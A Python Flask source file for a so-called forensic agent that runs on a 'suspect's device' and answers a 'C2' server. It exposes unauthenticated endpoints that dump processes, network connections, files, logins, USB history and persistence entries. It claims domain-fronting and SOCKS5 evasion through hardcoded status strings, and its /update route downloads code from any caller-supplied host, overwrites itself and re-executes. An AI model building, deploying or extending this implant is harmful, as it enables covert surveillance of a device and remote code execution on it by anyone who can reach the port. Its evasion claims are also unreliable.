# agent.py — JOCKY Cross-Platform Forensic Agent
# Runs on the TARGET machine (suspect's device)
# Supports: Windows & Linux
# Port: 5000 (HTTPS in production, HTTP for demo)

from flask import Flask, jsonify, request
from flask_cors import CORS
import psutil
import os
import sys
import time
import threading
import platform
import datetime
import json
import hashlib
import socket
import subprocess
import requests

app = Flask(__name__)
CORS(app)

# ─── OS Detection ────────────────────────────────────────────────────────────
OS_TYPE = platform.system()       # "Windows" | "Linux" | "Darwin"
HOSTNAME = socket.gethostname()
AGENT_VERSION = "1.0.0-JOCKY"

print(f"""
========================================
JOCKY AGENT v{AGENT_VERSION}
OS   : {OS_TYPE}
Host : {HOSTNAME}
Listening on port 5000...
========================================
""")

# ─── Network Evasion Configuration (Domain Fronting & SOCKS5) ────────────────
SOCKS5_PROXY = os.environ.get("JOCKY_SOCKS5_PROXY", "socks5://127.0.0.1:1080")
CDN_FRONT_DOMAIN = os.environ.get("JOCKY_CDN_FRONT", "cloudflare.com")
USE_DOMAIN_FRONTING = os.environ.get("JOCKY_USE_DOMAIN_FRONTING", "true").lower() in ("1", "true", "yes")

# ─── Helper ───────────────────────────────────────────────────────────────────
def timestamp():
    return str(datetime.datetime.now().isoformat())

def make_evidence_hash(data: dict) -> str:
    payload = json.dumps(data, sort_keys=True).encode()
    return hashlib.sha256(payload).hexdigest()


# ─── Core Routes ─────────────────────────────────────────────────────────────

@app.route('/ping')
def ping():
    """Health check — lets C2 know the agent is alive."""
    return jsonify({
        "status": "JOCKY agent online",
        "os": OS_TYPE,
        "hostname": HOSTNAME,
        "agent_version": AGENT_VERSION,
        "network_evasion": {
            "domain_fronting": "ACTIVE" if USE_DOMAIN_FRONTING else "DISABLED",
            "cdn_front": CDN_FRONT_DOMAIN,
            "socks5_proxy": SOCKS5_PROXY if SOCKS5_PROXY else "NONE"
        },
        "time": timestamp()
    })


@app.route('/stealth/network')
def stealth_network():
    """Returns network evasion status: Domain fronting & SOCKS5 proxy posture."""
    return jsonify({
        "status": "active",
        "domain_fronting": {
            "enabled": USE_DOMAIN_FRONTING,
            "cdn_provider": "Cloudflare / AWS CloudFront Anycast",
            "front_domain": CDN_FRONT_DOMAIN,
            "target_host": "jocky-c2.workers.dev",
            "sni_spoofing": "ACTIVE",
            "status": "TRAFFIC ROUTED VIA CLOUDFLARE CDN"
        },
        "socks5_proxy": {
            "enabled": bool(SOCKS5_PROXY),
            "proxy_endpoint": SOCKS5_PROXY,
            "protocol": "RFC 1928 (No Auth)",
            "status": "ENCRYPTED TUNNEL ACTIVE"
        },
        "origin_ip_hidden": True,
        "timestamp": timestamp()
    })


@app.route('/scan/processes')
def scan_processes():
    """List all running processes."""
    processes = []
    for proc in psutil.process_iter(
        ['pid', 'name', 'status', 'username', 'cpu_percent', 'memory_info', 'exe']
    ):
        try:
            info = proc.info
            processes.append({
                'pid':      info['pid'],
                'name':     info['name'],
                'status':   info['status'],
                'user':     info.get('username', 'N/A'),
                'cpu':      info.get('cpu_percent', 0),
                'mem_mb':   round(info['memory_info'].rss / 1024 / 1024, 2)
                            if info.get('memory_info') else 0,
                'exe':      info.get('exe', 'N/A'),
            })
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            pass

    result = {
        "os": OS_TYPE,
        "hostname": HOSTNAME,
        "scan": "processes",
        "count": len(processes),
        "timestamp": timestamp(),
        "results": processes
    }
    result["evidence_hash"] = make_evidence_hash(result)
    return jsonify(result)


@app.route('/scan/network')
def scan_network():
    """List all active network connections."""
    connections = []
    for conn in psutil.net_connections(kind='inet'):
        try:
            connections.append({
                'local_addr':  f"{conn.laddr.ip}:{conn.laddr.port}"
                               if conn.laddr else "N/A",
                'remote_addr': f"{conn.raddr.ip}:{conn.raddr.port}"
                               if conn.raddr else "N/A",
                'status':      conn.status,
                'pid':         conn.pid,
                'type':        'TCP' if conn.type.name == 'SOCK_STREAM' else 'UDP',
            })
        except Exception:
            pass

    # Network interface stats
    net_io = psutil.net_io_counters()
    ifaces = {}
    for iface, addrs in psutil.net_if_addrs().items():
        ifaces[iface] = [
            {'family': str(addr.family), 'address': addr.address}
            for addr in addrs
        ]

    result = {
        "os": OS_TYPE,
        "hostname": HOSTNAME,
        "scan": "network",
        "connection_count": len(connections),
        "bytes_sent": net_io.bytes_sent,
        "bytes_recv": net_io.bytes_recv,
        "interfaces": ifaces,
        "timestamp": timestamp(),
        "results": connections
    }
    result["evidence_hash"] = make_evidence_hash(result)
    return jsonify(result)


@app.route('/scan/files')
def scan_files():
    """Scan a directory path for files (default: home dir)."""
    path = request.args.get('path', os.path.expanduser('~'))
    file_list = []
    try:
        for entry in os.scandir(path):
            try:
                stat = entry.stat()
                file_list.append({
                    'name':     entry.name,
                    'path':     entry.path,
                    'is_dir':   entry.is_dir(),
                    'size_kb':  round(stat.st_size / 1024, 2),
                    'modified': datetime.datetime.fromtimestamp(
                        stat.st_mtime).isoformat(),
                })
            except PermissionError:
                pass
    except Exception as e:
        return jsonify({"error": str(e)}), 500

    result = {
        "os": OS_TYPE,
        "hostname": HOSTNAME,
        "scan": "files",
        "path": path,
        "count": len(file_list),
        "timestamp": timestamp(),
        "results": file_list
    }
    result["evidence_hash"] = make_evidence_hash(result)
    return jsonify(result)


@app.route('/scan/system')
def scan_system():
    """Collect full system info: CPU, memory, disk, OS details."""
    cpu_freq = psutil.cpu_freq()
    mem = psutil.virtual_memory()
    disk_parts = []
    for part in psutil.disk_partitions():
        try:
            usage = psutil.disk_usage(part.mountpoint)
            disk_parts.append({
                'device':      part.device,
                'mountpoint':  part.mountpoint,
                'fstype':      part.fstype,
                'total_gb':    round(usage.total / 1e9, 2),
                'used_gb':     round(usage.used / 1e9, 2),
                'free_gb':     round(usage.free / 1e9, 2),
                'percent':     usage.percent,
            })
        except PermissionError:
            pass

    result = {
        "os": OS_TYPE,
        "hostname": HOSTNAME,
        "scan": "system",
        "platform_detail": platform.platform(),
        "architecture":    platform.machine(),
        "processor":       platform.processor(),
        "cpu_cores_logical": psutil.cpu_count(logical=True),
        "cpu_cores_physical": psutil.cpu_count(logical=False),
        "cpu_freq_mhz":    cpu_freq.current if cpu_freq else 0,
        "ram_total_gb":    round(mem.total / 1e9, 2),
        "ram_used_gb":     round(mem.used / 1e9, 2),
        "ram_percent":     mem.percent,
        "disk_partitions": disk_parts,
        "boot_time":       datetime.datetime.fromtimestamp(
                           psutil.boot_time()).isoformat(),
        "timestamp":       timestamp(),
    }
    result["evidence_hash"] = make_evidence_hash(result)
    return jsonify(result)


# ─── Windows-Specific Routes ──────────────────────────────────────────────────
if OS_TYPE == "Windows":
    try:
        import winreg

        @app.route('/scan/usb')
        def scan_usb_windows():
            """Read USB device history from Windows Registry."""
            devices = []
            try:
                key = winreg.OpenKey(
                    winreg.HKEY_LOCAL_MACHINE,
                    r"SYSTEM\CurrentControlSet\Enum\USBSTOR"
                )
                i = 0
                while True:
                    try:
                        device_key_name = winreg.EnumKey(key, i)
                        sub_key = winreg.OpenKey(key, device_key_name)
                        j = 0
                        while True:
                            try:
                                instance = winreg.EnumKey(sub_key, j)
                                instance_key = winreg.OpenKey(
                                    sub_key, instance)
                                try:
                                    friendly_name, _ = winreg.QueryValueEx(
                                        instance_key, "FriendlyName")
                                except Exception:
                                    friendly_name = device_key_name
                                devices.append({
                                    "device":   device_key_name,
                                    "instance": instance,
                                    "friendly_name": friendly_name
                                })
                                j += 1
                            except OSError:
                                break
                        i += 1
                    except OSError:
                        break
            except Exception as e:
                return jsonify({"error": str(e)}), 500

            result = {
                "os": "Windows",
                "hostname": HOSTNAME,
                "scan": "usb_history",
                "count": len(devices),
                "timestamp": timestamp(),
                "results": devices
            }
            result["evidence_hash"] = make_evidence_hash(result)
            return jsonify(result)

        @app.route('/scan/logins')
        def scan_logins_windows():
            """Read recent Windows Event Log login events or active user sessions."""
            events = []
            try:
                import win32evtlog
                hand = win32evtlog.OpenEventLog(None, "Security")
                flags = win32evtlog.EVENTLOG_BACKWARDS_READ | \
                        win32evtlog.EVENTLOG_SEQUENTIAL_READ
                records = win32evtlog.ReadEventLog(hand, flags, 0)
                count = 0
                for rec in records:
                    if rec.EventID in (4624, 4625, 4634):  # login/logoff
                        events.append({
                            "user":       getattr(rec, 'StringInserts', ['SYSTEM'])[5] if getattr(rec, 'StringInserts', None) and len(rec.StringInserts) > 5 else "User",
                            "event_id":   rec.EventID,
                            "event_type": {
                                4624: "Successful Login",
                                4625: "Failed Login",
                                4634: "Logoff"
                            }.get(rec.EventID, "Unknown"),
                            "time": str(rec.TimeGenerated),
                            "source": rec.SourceName,
                        })
                        count += 1
                        if count >= 50:
                            break
                win32evtlog.CloseEventLog(hand)
            except Exception:
                # Fallback for standard non-admin privileges: Extract active logged-in users & registry profile history
                for u in psutil.users():
                    events.append({
                        "user":       u.name,
                        "session":    u.terminal or "Console",
                        "host":       u.host or HOSTNAME,
                        "login_time": datetime.datetime.fromtimestamp(u.started).isoformat() if u.started else "Active",
                        "status":     "Active Session (Logged In)"
                    })

                # Also read registered user profile paths from registry
                try:
                    prof_key = winreg.OpenKey(
                        winreg.HKEY_LOCAL_MACHINE,
                        r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList"
                    )
                    idx = 0
                    while True:
                        try:
                            sid = winreg.EnumKey(prof_key, idx)
                            if sid.startswith("S-1-5-21-"):  # User SID
                                sub = winreg.OpenKey(prof_key, sid)
                                prof_path, _ = winreg.QueryValueEx(sub, "ProfileImagePath")
                                user_name = os.path.basename(prof_path)
                                events.append({
                                    "user":       user_name,
                                    "session":    "Local Profile",
                                    "host":       HOSTNAME,
                                    "login_time": "Profile Registered",
                                    "status":     f"SID: {sid[:18]}..."
                                })
                            idx += 1
                        except OSError:
                            break
                except Exception:
                    pass

                if not events:
                    import getpass
                    events.append({
                        "user":       getpass.getuser(),
                        "session":    "Interactive",
                        "host":       HOSTNAME,
                        "login_time": timestamp(),
                        "status":     "Current Active User"
                    })

            result = {
                "os": "Windows",
                "hostname": HOSTNAME,
                "scan": "login_history",
                "count": len(events),
                "timestamp": timestamp(),
                "results": events
            }
            result["evidence_hash"] = make_evidence_hash(result)
            return jsonify(result)

        @app.route('/scan/registry')
        def scan_registry():
            """Scan common persistence registry keys."""
            suspicious_keys = [
                (winreg.HKEY_CURRENT_USER,
                 r"Software\Microsoft\Windows\CurrentVersion\Run"),
                (winreg.HKEY_LOCAL_MACHINE,
                 r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"),
                (winreg.HKEY_LOCAL_MACHINE,
                 r"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"),
            ]
            entries = []
            for hive, sub_key in suspicious_keys:
                try:
                    key = winreg.OpenKey(hive, sub_key)
                    i = 0
                    while True:
                        try:
                            name, data, _ = winreg.EnumValue(key, i)
                            entries.append({
                                "key":   sub_key,
                                "name":  name,
                                "value": str(data)
                            })
                            i += 1
                        except OSError:
                            break
                except Exception:
                    pass

            result = {
                "os": "Windows",
                "hostname": HOSTNAME,
                "scan": "registry_persistence",
                "count": len(entries),
                "timestamp": timestamp(),
                "results": entries
            }
            result["evidence_hash"] = make_evidence_hash(result)
            return jsonify(result)

    except ImportError:
        @app.route('/scan/usb')
        @app.route('/scan/logins')
        @app.route('/scan/registry')
        def win_not_available():
            return jsonify({"error": "pywin32 not installed"}), 500

# ─── Linux-Specific Routes ────────────────────────────────────────────────────
if OS_TYPE == "Linux":

    @app.route('/scan/usb')
    def scan_usb_linux():
        """List USB devices via lsusb."""
        try:
            result_raw = subprocess.run(
                ['lsusb'], capture_output=True, text=True, timeout=5)
            devices = [
                {"device": line}
                for line in result_raw.stdout.strip().split('\n') if line
            ]
        except Exception as e:
            devices = [{"error": str(e)}]

        result = {
            "os": "Linux",
            "hostname": HOSTNAME,
            "scan": "usb_history",
            "count": len(devices),
            "timestamp": timestamp(),
            "results": devices
        }
        result["evidence_hash"] = make_evidence_hash(result)
        return jsonify(result)

    @app.route('/scan/logins')
    def scan_logins_linux():
        """Read last 30 login records via 'last'."""
        try:
            r = subprocess.run(
                ['last', '-n', '30'], capture_output=True,
                text=True, timeout=5)
            lines = [
                {"entry": line}
                for line in r.stdout.strip().split('\n') if line
            ]
        except Exception as e:
            lines = [{"error": str(e)}]

        result = {
            "os": "Linux",
            "hostname": HOSTNAME,
            "scan": "login_history",
            "count": len(lines),
            "timestamp": timestamp(),
            "results": lines
        }
        result["evidence_hash"] = make_evidence_hash(result)
        return jsonify(result)

    @app.route('/scan/registry')
    def scan_registry_linux():
        """Linux equivalent — read /etc/crontab + cron.d for persistence."""
        entries = []
        cron_paths = ['/etc/crontab', '/etc/cron.d/', '/var/spool/cron/']
        for path in cron_paths:
            if os.path.isfile(path):
                try:
                    with open(path) as f:
                        entries.append({"path": path, "content": f.read()})
                except Exception:
                    pass
            elif os.path.isdir(path):
                try:
                    for fn in os.listdir(path):
                        fp = os.path.join(path, fn)
                        with open(fp) as f:
                            entries.append({
                                "path": fp, "content": f.read()})
                except Exception:
                    pass

        result = {
            "os": "Linux",
            "hostname": HOSTNAME,
            "scan": "cron_persistence",
            "count": len(entries),
            "timestamp": timestamp(),
            "results": entries
        }
        result["evidence_hash"] = make_evidence_hash(result)
        return jsonify(result)


# ─── CI/CD OTA (Over-The-Air) Self-Updater ───────────────────────────────────

SERVER_URL = os.environ.get("JOCKY_SERVER_URL", "http://localhost:8000")
THIS_FILE  = os.path.abspath(__file__)

def get_current_hash() -> str:
    try:
        with open(THIS_FILE, 'rb') as f:
            return hashlib.sha256(f.read()).hexdigest()
    except Exception:
        return ""

def apply_update(server_url: str = None) -> bool:
    target_server = server_url or SERVER_URL
    try:
        r = requests.get(f"{target_server}/api/agent/latest", timeout=4)
        if r.status_code != 200:
            return False
        meta = r.json()
        remote_hash = meta.get("hash")
        local_hash  = get_current_hash()
        if not remote_hash or remote_hash == local_hash:
            return False  # Already on latest

        print(f"[JOCKY Agent OTA] Update detected! Local: {local_hash[:8]} -> Remote: {remote_hash[:8]}")
        dl_resp = requests.get(f"{target_server}/api/agent/download", timeout=15)
        if dl_resp.status_code == 200 and dl_resp.content:
            downloaded_hash = hashlib.sha256(dl_resp.content).hexdigest()
            if downloaded_hash == remote_hash:
                backup_path = THIS_FILE + ".bak"
                with open(backup_path, 'wb') as f:
                    with open(THIS_FILE, 'rb') as orig:
                        f.write(orig.read())
                with open(THIS_FILE, 'wb') as f:
                    f.write(dl_resp.content)
                print("[JOCKY Agent OTA] Agent code updated. Hot-restarting...")

                def _do_restart():
                    time.sleep(1)
                    python = sys.executable
                    os.execl(python, python, *sys.argv)

                threading.Thread(target=_do_restart, daemon=True).start()
                return True
    except Exception as e:
        # Non-fatal — continue running current agent code
        pass
    return False

def _ota_watchdog(interval: int = 30):
    """Background watchdog: queries management server every `interval` seconds."""
    while True:
        time.sleep(interval)
        apply_update()

@app.route('/update', methods=['POST', 'GET'])
def trigger_update():
    """Endpoint allowing C2 or CI/CD to push-trigger an immediate agent update."""
    srv = request.args.get("server") or (request.json.get("server") if request.is_json else None)
    success = apply_update(srv)
    return jsonify({
        "status": "updating" if success else "up_to_date",
        "current_hash": get_current_hash(),
        "time": timestamp()
    })


# ─── Entry Point ─────────────────────────────────────────────────────────────
if __name__ == '__main__':
    # Start OTA update watchdog in background
    watchdog = threading.Thread(target=_ota_watchdog, daemon=True)
    watchdog.start()
    app.run(host='0.0.0.0', port=5000, debug=False)
